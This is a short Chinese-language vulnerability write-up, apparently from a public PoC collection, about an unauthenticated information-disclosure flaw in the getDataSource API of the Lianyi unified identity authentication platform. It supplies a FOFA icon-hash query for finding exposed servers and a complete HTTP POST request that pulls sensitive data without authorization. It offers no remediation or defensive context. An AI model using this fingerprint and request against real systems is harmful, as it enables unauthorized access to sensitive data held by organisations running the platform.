## 联奕统一身份认证平台getDataSource存在信息泄露漏洞

联奕统一身份认证平台getDataSource 未授权访问,攻击者可通过此漏洞获取敏感信息。

## fofa

```yaml
icon_hash="772658742"
```

## poc

```yaml
POST /api/bd-mdp/serviceManager/outInterface/getDataSource HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Linux; Android 11; motorola edge 20 fusion) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.61 Mobile Safari/537.36
Transfer-Encoding: chunked
Accept-Charset: utf-8
Accept-Encoding: gzip, deflate
Connection: close

0
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407111939955.png)